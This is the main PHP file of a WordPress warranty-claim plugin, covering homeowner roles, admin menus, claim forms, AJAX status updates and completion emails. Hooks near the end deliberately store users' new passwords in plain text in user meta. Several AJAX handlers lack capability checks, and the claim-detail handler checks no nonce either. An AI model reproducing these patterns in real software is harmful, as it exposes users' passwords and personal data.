<?php
/**
 * Plugin Name: Warranty Claim Plugin
 * Description: A plugin for managing warranty claims.
 * Version: 1.0
 * Author: Adeel Muzaffar
 */

// Include necessary files
require_once plugin_dir_path(__FILE__) . 'includes/add-user.php';
require_once plugin_dir_path(__FILE__) . 'includes/users-list.php';
require_once plugin_dir_path(__FILE__) . 'includes/claims.php';
require_once plugin_dir_path(__FILE__) . 'includes/home-owner-dashboard.php';
require_once plugin_dir_path(__FILE__) . 'includes/login-form.php';
require_once plugin_dir_path(__FILE__) . 'includes/warranty-list-user.php';
require_once plugin_dir_path(__FILE__) . 'includes/home-owner-profile.php';

// Activation: Create custom role
function create_custom_role_on_activation() {
    if (!get_role('home_owner')) {
        add_role(
            'home_owner',
            'Home Owner',
            array(
                'read'         => true,
                'edit_posts'   => false,
                'delete_posts' => false,
            )
        );
    }
}
register_activation_hook(__FILE__, 'create_custom_role_on_activation');

function remove_custom_role_on_deactivation() {
    remove_role('home_owner');
}
register_deactivation_hook(__FILE__, 'remove_custom_role_on_deactivation');

function my_custom_plugin_add_admin_page() {
    add_menu_page(
        'Warranty Claim', 
        'Warranty Claim',
        'manage_options', 
        'warranty-claim',
        'warranty_claim_claims',
        'dashicons-admin-generic',
        25
    );
    add_submenu_page(
        'warranty-claim',
        'Users List',
        'Home Owners',
        'manage_options',
        'warranty-claim-users-list',
        'warranty_claim_users_list'
    );
    add_submenu_page(
        'warranty-claim',
        'Add User',
        'Add Home Owner',
        'manage_options',
        'warranty-claim-register-user',
        'warranty_claim_register_user'
    );
}
add_action('admin_menu', 'my_custom_plugin_add_admin_page');

function warranty_claim_enqueue_limited_admin_assets($hook) {
    if (strpos($hook, 'warranty-claim') !== false) {
        wp_enqueue_style('warranty-claim-admin-css', plugin_dir_url(__FILE__) . 'assets/css/admin-style.css');
        wp_enqueue_script('warranty-claim-admin-js', plugin_dir_url(__FILE__) . 'assets/js/admin-script.js', array('jquery'), '1.0', true);
    }
}
add_action('admin_enqueue_scripts', 'warranty_claim_enqueue_limited_admin_assets');
function enqueue_custom_styles() {
    $css_file_path = plugin_dir_url(__FILE__) . 'assets/css/custom-style.css'; 

    wp_enqueue_style('custom-style', $css_file_path, array(), null, 'all');
}
add_action('wp_enqueue_scripts', 'enqueue_custom_styles');

function enqueue_sweetalert2_script() {
    if (is_admin()) {
        wp_enqueue_script('sweetalert2', 'https://cdn.jsdelivr.net/npm/sweetalert2@11', [], null, true);
    }
}
add_action('admin_enqueue_scripts', 'enqueue_sweetalert2_script');

// Add loader
function enqueue_loader_assets() {
    echo '<div class="loader-overlay">
            <div class="loader">
                <div class="loader__bar"></div>
                <div class="loader__bar"></div>
                <div class="loader__bar"></div>
                <div class="loader__bar"></div>
                <div class="loader__bar"></div>
                <div class="loader__ball"></div>
            </div>
        </div>';
    wp_enqueue_style('loader-style', plugin_dir_url(__FILE__) . 'assets/css/loader.css');
    wp_enqueue_script('loader-script', plugin_dir_url(__FILE__) . 'assets/js/loader.js', array(), '1.0', true);
}
add_action('admin_enqueue_scripts', 'enqueue_loader_assets');

function enqueue_toggle_user_status_script() {
    wp_enqueue_script('user-status-toggle', plugin_dir_url(__FILE__) . 'assets/js/user-status-toggle.js', array('jquery'), null, true);
    wp_localize_script('user-status-toggle', 'userStatusAjax', array(
        'ajax_url' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('user_status_nonce')
    ));
    wp_enqueue_script('claim-status-toggle', plugin_dir_url(__FILE__) . 'assets/js/claim-status-toggle.js', array('jquery'), time(), true);
    wp_localize_script('claim-status-toggle', 'claimStatusAjax', array(
        'ajax_url' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('claim_status_nonce')
    ));
}
add_action('admin_enqueue_scripts', 'enqueue_toggle_user_status_script');
function enqueue_bootstrap_cdn() {
    wp_enqueue_style(
        'bootstrap-css',
        'https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css',
        array(), // Dependencies (none in this case)
        '4.0.0' // Version number
    );
    wp_enqueue_script(
        'bootstrap-js', // Handle for the script
        'https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js', // CDN URL
        array('jquery'), // Dependencies (Bootstrap requires jQuery)
        '4.0.0', // Version number
        true // Load in the footer
    );
    wp_enqueue_script(
        'popper-js', // Handle for the script
        'https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js', // CDN URL
        array(), // Dependencies (none in this case)
        '1.12.9', // Version number
        true // Load in the footer
    );
}
add_action('admin_enqueue_scripts', 'enqueue_bootstrap_cdn');

function update_user_status() {
    if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'user_status_nonce')) {
        wp_send_json_error(array('message' => 'Nonce verification failed'));
    }

    $user_id = intval($_POST['user_id']);
    $status = sanitize_text_field($_POST['status']);

    if (empty($user_id) || !get_user_by('id', $user_id)) {
        wp_send_json_error(array('message' => 'Invalid user ID'));
    }

    $update_status = update_user_meta($user_id, 'custom_user_status', $status);

    if ($update_status) {
        wp_send_json_success(array('status' => $status));
    } else {
        wp_send_json_error(array('message' => 'Failed to update user status'));
    }
}
add_action('wp_ajax_update_user_status', 'update_user_status');
function update_claim_status() {
    if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'claim_status_nonce')) {
        wp_send_json_error(array('message' => 'Nonce verification failed'));
    }

    $claim_id = intval($_POST['claim_id']);
    $status = sanitize_text_field($_POST['status']);
    $claim_post = get_post($claim_id);
    
    if ($claim_post && $claim_post->post_type === 'claim_entry') {
        update_post_meta($claim_id, 'claim_status', $status);
        
        wp_update_post([
            'ID' => $claim_id,
            'post_modified' => current_time('mysql'),
            'post_modified_gmt' => current_time('mysql', 1)
        ]);
        
        $updated_time = get_post_modified_time('d-M-Y g:i A', false, $claim_id);
        
        if ($status === 'completed') {
            send_claim_completed_email($claim_id, $status);
        } 
        wp_send_json_success([
            'message' => 'Claim status updated successfully!',
            'status' => ucwords(str_replace('_', ' ', $status)),
            'update_time' => $updated_time
        ]);
    } else {
        wp_send_json_error(['message' => 'Invalid claim ID or post type.']);
    }
}

add_action('wp_ajax_update_claim_status', 'update_claim_status');

function redirect_logged_in_homeowners() {
    if (is_user_logged_in()) {
        $current_user = wp_get_current_user();
        if (in_array('home_owner', (array) $current_user->roles)) {
            if (is_admin()) {
                return;
            }
        }
    }
}
add_action('template_redirect', 'redirect_logged_in_homeowners');

function my_plugin_activate() {
    $existing_login_page_id = get_page_by_title('Login Page');
    $existing_warranty_form_id = get_page_by_title('Warranty Form');
    $existing_warranty_list_id = get_page_by_title('Warranty List');
    $existing_home_owner_profile_id = get_page_by_title('Home Owner Profile');
    
    if (!$existing_login_page_id) {
        $login_page = array(
            'post_title'   => 'Login Page',
            'post_content' => '[login_form]',
            'post_status'  => 'publish',
            'post_type'    => 'page',
        );
        $login_page_id = wp_insert_post($login_page);
    } else {
        $login_page_id = $existing_login_page_id->ID;
    }

    if (!$existing_warranty_form_id) {
        $warranty_form = array(
            'post_title'   => 'Warranty Form',
            'post_content' => '[warranty_form]',
            'post_status'  => 'publish',
            'post_type'    => 'page',
        );
        $warranty_form_page_id = wp_insert_post($warranty_form);
    } else {
        $warranty_form_page_id = $existing_warranty_form_id->ID;
    }

    if (!$existing_warranty_list_id) {
        $warranty_list_page = array(
            'post_title'   => 'Warranty List',
            'post_content' => '[warranty_list_user]',
            'post_status'  => 'publish',
            'post_type'    => 'page',
        );
        $warranty_list_page_id = wp_insert_post($warranty_list_page);
    } else {
        $warranty_list_page_id = $existing_warranty_list_id->ID;
    }
    if (!$existing_home_owner_profile_id) {
        $home_owner_profile_page = array(
            'post_title'   => 'Home Owner Profile',
            'post_content' => '[home_owner_profile]',
            'post_status'  => 'publish',
            'post_type'    => 'page',
        );
        $home_owner_profile_page_id = wp_insert_post($home_owner_profile_page);
    } else {
        $home_owner_profile_page_id = $existing_home_owner_profile_id->ID;
    }

    update_option('home_owner_login_page_id', $login_page_id);
    update_option('warranty_form_page_id', $warranty_form_page_id);
    update_option('warranty_list_page_id', $warranty_list_page_id);
    update_option('home_owner_profile_page_id', $home_owner_profile_page_id);

    flush_rewrite_rules();
}
register_activation_hook(__FILE__, 'my_plugin_activate');

function create_form_entries_table() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'form_entries';
    $charset_collate = $wpdb->get_charset_collate();

    $sql = "CREATE TABLE $table_name (
        id BIGINT(20) NOT NULL AUTO_INCREMENT,
        user_id BIGINT(20) NOT NULL,
        dropdown_value VARCHAR(255) NOT NULL,
        description TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
        PRIMARY KEY (id)
    ) $charset_collate;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
}
register_activation_hook(__FILE__, 'create_form_entries_table');
  
function login_logout_button_shortcode() {  
    if (is_user_logged_in()) {  
       $button = '<a href="' . wp_logout_url(get_permalink(get_option('home_owner_login_page_id'))) . '">Logout</a>';  
    } else {  
       $button = '<a href="' . get_permalink(get_option('home_owner_login_page_id')) . '">Login</a>';  
    }  
    return $button;  
 }  
 add_shortcode('login_logout_button', 'login_logout_button_shortcode');
 
 function custom_user_form_shortcode() {
    // Ensure the user is logged in.
    if (!is_user_logged_in()) {
        return '<p>You must be logged in to submit this form.</p>';
    }

    ob_start(); 
    ?>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <form id="custom-user-form" method="post">
        <label for="dropdown">Select Options:</label>
        <select name="dropdown[]" id="dropdown" multiple required>
            <option value="Electrical">Electrical</option>
            <option value="HVAC">HVAC</option>
            <option value="Septic">Septic</option>
            <option value="Flooring">Flooring</option>
            <option value="Plumbing">Plumbing</option>
            <option value="Windows and Doors">Windows and Doors</option>
            <option value="Cabinets and Countertops">Cabinets and Countertops</option>
            <option value="Roof">Roof</option>
            <option value="Solar">Solar</option>
            <option value="Appliances">Appliances</option>
            <option value="Others">Others</option>
        </select>

        <label for="description" id="description-label">Description:</label>
        <textarea name="description" id="description" rows="5" required></textarea>

        <?php wp_nonce_field('custom_user_form_action', 'custom_user_form_nonce'); ?>
        <p id="appliances-message" style="display: none;">Your appliances are warrantied directly from the manufacturer, please contact your appliance manufacturer for any warranty claims</p>
        <button type="submit" name="submit_form" id="submit-button">Submit</button>
    </form>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const dropdown = document.getElementById('dropdown');
            const description = document.getElementById('description');
            const descriptionLabel = document.getElementById('description-label');
            const submitButton = document.getElementById('submit-button');
            const appliancesMessage = document.getElementById('appliances-message');

            dropdown.addEventListener('change', function () {
                const selectedOptions = Array.from(dropdown.selectedOptions).map(opt => opt.value);

                if (selectedOptions.includes('Appliances')) {
                    description.style.display = 'none';
                    descriptionLabel.style.display = 'none';
                    submitButton.style.display = 'none';
                    appliancesMessage.style.display = 'block';
                } else {
                    description.style.display = 'block';
                    descriptionLabel.style.display = 'block';
                    submitButton.style.display = 'inline-block';
                    appliancesMessage.style.display = 'none';
                }
            });
        });
    </script>
    <?php
    return ob_get_clean();
}
add_shortcode('custom_user_form', 'custom_user_form_shortcode');

function handle_form_submission() {
    if (
        isset($_POST['submit_form']) &&
        isset($_POST['custom_user_form_nonce']) &&
        wp_verify_nonce($_POST['custom_user_form_nonce'], 'custom_user_form_action')
    ) {
        $current_user = wp_get_current_user();
        $user_id = $current_user->ID;

        // Sanitize form inputs
        $dropdown_values = isset($_POST['dropdown']) ? array_map('sanitize_text_field', $_POST['dropdown']) : [];
        $description = isset($_POST['description']) ? sanitize_textarea_field($_POST['description']) : '';

        // Prepare the post data
        $post_data = [
            'post_type'    => 'claim_entry',
            'post_title'   => implode(', ', $dropdown_values),
            'post_content' => $description,
            'post_status'  => 'publish',
            'post_author'  => $user_id,
        ];

        // Insert the post
        $post_id = wp_insert_post($post_data);

        // Redirect with success or error message
        if ($post_id && !is_wp_error($post_id)) {
            update_post_meta($post_id, 'claim_status', 'submitted');
            wp_redirect(add_query_arg('success', '1', wp_get_referer()));
            exit;
        } else {
            wp_redirect(add_query_arg('error', '1', wp_get_referer()));
            exit;
        }
    }
}
add_action('template_redirect', 'handle_form_submission');

function display_form_success_message() {
    if (isset($_GET['success']) && $_GET['success'] == '1') {
        $redirect_url = get_permalink(get_option('warranty_list_page_id'));
        ?>
        <script type="text/javascript">
            var redirect_url = <?php echo json_encode($redirect_url) ?>;
            Swal.fire({
                title: "Form submitted successfull!",
                text: "You're request submitted, we'll email you once its done",
                icon: "success"
            }).then((result) => {
                if (result.isConfirmed) {
                    if (window.history.replaceState) {
                        const url = new URL(window.location.href);
                        url.searchParams.delete('success');
                        window.history.replaceState({}, '', url.toString());
                    }
                    window.location.href = redirect_url;
                }
            });
        </script>
        <?php
    } elseif(isset($_GET['error']) && $_GET['error'] == '1'){
        ?>
        <script type="text/javascript">
            Swal.fire({
                title: "Form submitted successfull!",
                text: "You're request submitted, we'll email you once it done",
                icon: "error"
            });
        </script>
        <?php
    }
}
add_action('wp_footer', 'display_form_success_message');


// function insert_dummy_claim_entries() {
//     if ( ! current_user_can( 'administrator' ) ) {
//         return; // Only allow administrators to run this function.
//     }

//     // Define dummy data with status
//     $dummy_entries = array(
//         array(
//             'user_id' => 20, // Replace with a valid user ID
//             'dropdown_value' => 'Option 1',
//             'description' => 'This is a dummy claim description for option 1.',
//             'status' => 'pending', // Default status
//         ),
//         array(
//             'user_id' => 20, // Replace with another valid user ID
//             'dropdown_value' => 'Option 2',
//             'description' => 'This is a dummy claim description for option 2.',
//             'status' => 'in_action', // Set status as 'in_action'
//         ),
//         array(
//             'user_id' => 14, // Replace with another valid user ID
//             'dropdown_value' => 'Option 3',
//             'description' => 'This is a dummy claim description for option 3.',
//             'status' => 'completed', // Set status as 'completed'
//         ),
//     );

//     foreach ( $dummy_entries as $entry ) {
//         // Insert the dummy claim entry as a custom post type or custom table (e.g., "claim_entry")
//         $post_data = array(
//             'post_title'   => $entry['dropdown_value'], // Title of the post
//             'post_content' => $entry['description'], // Description of the claim
//             'post_status'  => 'publish',
//             'post_author'  => $entry['user_id'], // Link the post to the user
//             'post_type'    => 'claim_entry', // Custom post type (you can replace it with your actual custom post type)
//         );

//         $post_id = wp_insert_post( $post_data );

//         // Optionally, store the dropdown value and status as post meta
//         if ( $post_id ) {
//             update_post_meta( $post_id, 'claim_dropdown_value', $entry['dropdown_value'] );
//             update_post_meta( $post_id, 'claim_status', $entry['status'] ); // Store the status
//         }
//     }

//     echo 'Dummy claim entries inserted successfully.';
// }

// add_action( 'admin_init', 'insert_dummy_claim_entries' );

// function delete_claim_entries() {
//     $args = array(
//         'post_type' => 'claim_entry',  // Specify the custom post type
//         'posts_per_page' => -1,         // Fetch all posts
//         'post_status' => 'any',         // Get all statuses
//     );

//     $posts = get_posts($args);

//     foreach ($posts as $post) {
//         wp_delete_post($post->ID, true); // Delete the post permanently
//     }
// }

// // Run the deletion function (only do this once)
// delete_claim_entries();

function fetch_claim_detail_callback() {
    $claim_id = intval($_POST['claim_id']);
    if ($claim_id && get_post_type($claim_id) === 'claim_entry') {
        $claim = get_post($claim_id);
        $claim_description = $claim->post_content;
        $owner_id = $claim->post_author;
        $property_address = get_user_meta($owner_id, 'address', true);
        
        $claim_author = get_userdata($owner_id);
        $home_owner_name = $claim_author->user_login;
        
        $claim_name = $claim->post_title;
        $stored_date = get_user_meta($owner_id, 'effective_date', true);
        if ($stored_date) {
            $effective_date = DateTime::createFromFormat('Y-m-d', $stored_date)->format('d-M-Y');
        } else {
            $effective_date = '';
        }

        $user_email = $claim_author->user_email;

        $claim_status = get_post_meta($claim->ID, 'claim_status', true);
        $claim_status_text = ucwords(str_replace('_', ' ', $claim_status));

        $post_date = get_the_date('d-M-Y g:i A', $claim->ID);
        $post_modified = get_post_modified_time('d-M-Y g:i A', false, $claim->ID);

        ob_start();
        ?>
        <p><strong>Property Address:</strong> <?php echo esc_html($property_address); ?></p>
        <p><strong>Home Owner Name:</strong> <?php echo esc_html($home_owner_name); ?></p>
        <p><strong>Claim:</strong> <?php echo esc_html($claim_name); ?></p>
        <p><strong>Description:</strong> <?php echo esc_html($claim_description); ?></p>
        <p><strong>Status:</strong> <?php echo esc_html($claim_status_text); ?></p>
        <p><strong>Effective Date:</strong> <?php echo esc_html($effective_date); ?></p>
        <p><strong>Date of Submission:</strong> <?php echo esc_html(get_the_date('d-M-Y g:i A', $claim_id)); ?></p>
        <p><strong>Last Updated:</strong> <?php echo esc_html($post_modified); ?></p>
        <?php
        $html = ob_get_clean();

        wp_send_json_success(['html' => $html]);
    } else {
        wp_send_json_error(['message' => 'Invalid claim ID']);
    }
}

add_action('wp_ajax_fetch_claim_detail', 'fetch_claim_detail_callback');
function update_plain_text_password($user, $new_password) {
    update_user_meta($user->ID, 'plain_text_password', $new_password);
}
add_action('password_reset', 'update_plain_text_password', 10, 2);
function update_plain_text_password_on_profile_update($user_id, $old_user_data) {
    $user = get_user_by('id', $user_id);
    if (isset($_POST['pass1']) && $_POST['pass1'] !== '') {
        update_user_meta($user_id, 'plain_text_password', $_POST['pass1']);
    }
}
add_action('profile_update', 'update_plain_text_password_on_profile_update', 10, 2);

function send_claim_completed_email($claim_id, $status) {
    $claim_post = get_post($claim_id);
    
    if ($claim_post && $claim_post->post_type === 'claim_entry') {
        $post_author_id = get_post_field('post_author', $claim_id);
        $author_email = get_the_author_meta('user_email', $post_author_id);
        $author_username = get_the_author_meta('user_login', $post_author_id);
        $claim_title = get_the_title($claim_id);
        $updated_time = get_post_modified_time('d-M-Y g:i A', false, $claim_id);

        if ($status === 'completed') {
            $subject = 'Claim Completed: ' . $claim_title;
            $message = "
Dear {$author_username},

We are pleased to inform you that your claim titled '{$claim_title}' has been successfully completed. We truly appreciate your patience and cooperation during this process.

---

**Claim Details:**
- **Claim Title**: {$claim_title}
- **Status**: Completed
- **Updated Time**: {$updated_time}

---

Thank you for trusting us with your claim. We look forward to serving you again in the future.

Best regards,  
The Ecosun Homes Team  
";


            $headers = array('Content-Type: text/plain; charset=UTF-8');

            // Send the email to the user
            wp_mail($author_email, $subject, $message, $headers);

        }
    }
}
function hide_admin_bar_for_home_owner() {
    if (current_user_can('home_owner')) {
        add_filter('show_admin_bar', '__return_false');
    }
}
add_action('wp', 'hide_admin_bar_for_home_owner');

add_action('init', function() use ($aio_wp_security) {
    if ($aio_wp_security->configs->get_value('aiowps_enable_login_captcha') == '1') {
        add_action('my_custom_login_form', array($aio_wp_security->captcha_obj, 'insert_captcha_question_form'));
    } 
});
if (defined('WP_INSTALLING') && WP_INSTALLING) {
    return;
}
function logoutAndRedirectToLogin() {

    wp_logout();
    wp_redirect(site_url('login-page?status=inactive'));
    exit;
}